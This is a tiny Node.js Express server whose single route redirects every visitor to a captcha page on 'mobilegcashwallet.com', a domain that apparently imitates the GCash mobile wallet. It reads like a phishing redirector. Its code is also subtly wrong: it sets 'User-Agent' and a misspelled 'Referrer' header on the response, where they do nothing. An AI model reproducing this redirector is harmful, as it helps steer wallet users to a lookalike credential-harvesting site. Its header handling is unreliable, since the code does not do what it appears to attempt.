const express = require('express');
const app = express();

// Define a route to redirect to the website
app.get('/', (req, res) => {
  res.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
  res.set('Referrer', 'https://mobilegcashwallet.com');
  res.redirect('https://mobilegcashwallet.com/captchav1.php');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
